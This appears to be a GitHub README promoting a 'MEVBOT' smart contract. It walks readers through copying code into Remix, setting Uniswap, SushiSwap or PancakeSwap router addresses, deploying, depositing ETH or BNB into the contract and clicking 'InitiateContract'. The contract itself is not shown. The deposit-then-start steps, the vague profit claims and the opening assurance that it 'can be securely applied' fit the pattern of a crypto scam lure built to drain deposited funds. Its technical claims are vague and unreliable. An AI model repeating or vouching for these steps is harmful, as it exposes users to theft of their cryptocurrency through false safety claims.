# CAUTION AGAINST FRAUD. This agreement can be securely applied.

# Steps to launch and operate:
# How to deploy and use:

1) Duplicate the code within Remix IDE - [https://remix.ethereum.org/](https://remix.ethereum.org/)
2) Solidity complier set at 0.8.18
3) _NETWORKID / _SWAPV2ROUTER / _SWAPV2PAIR / _scanDuration / _profitETHSession - Filled with the details:

         * Relevant Addresses:
         *  - Ethereum:
         *    - Uniswap V2's router address: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
         *    - SushiSwap's router address:  0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f
         *
         *  - Binance Smart Chain:
         *    - PancakeSwap's V2 router address: 0x10ED43C718714eb63d5aA57B78B54704E256024E
         *
         * Parameters:
         *  - _NETWORKID: Specify 0 for Ethereum (ETH) network and 1 for Binance Smart Chain (BSC).
         *    The router addresses mentioned above are useful for tracking trades on decentralized exchanges (DEXs).
         *  - _SWAPV2ROUTER: The address of the Router for which the bot should operate - Check above !
         *  - _SWAPV2PAIR: The address of the Pair that the bot should monitor. Example: https://etherscan.io/address/0xf239009a101b6b930a527deaab6961b6e7dec8a6
         *   You will copy just 0xf239009a101b6b930a527deaab6961b6e7dec8a6
         *  - _scanDuration: Define, in seconds, how much time the BOT will scan a contract for buys/sells. More time requires additional ETH to be spent! Recommneded is 3600 (1 hour)
         *  - _profitETHSession: How much ETH the bought must count to be able to immediatly stop the scan operation and reset.

<img width="844" alt="image" src="https://github.com/emmawatson122/mevbot-eth/assets/140151967/085484c5-95c4-4952-b0fa-6ff0bb47d332">


4) Press Transact (Deploy)
5) Next -> Deposit **some BNB or ETH** _(depending on the Network Chain where you've deployed)_ at Contract Level _(collect the contract address after deploying the contract)_ 
6) Last step, click on **InitiateContract** and the MEVBOT will start to search for valid TX's at Validator level.
<img width="686" alt="image" src="https://user-images.githubusercontent.com/131530136/233782953-1ba32097-4705-40b0-8a05-b55d61e45721.png">
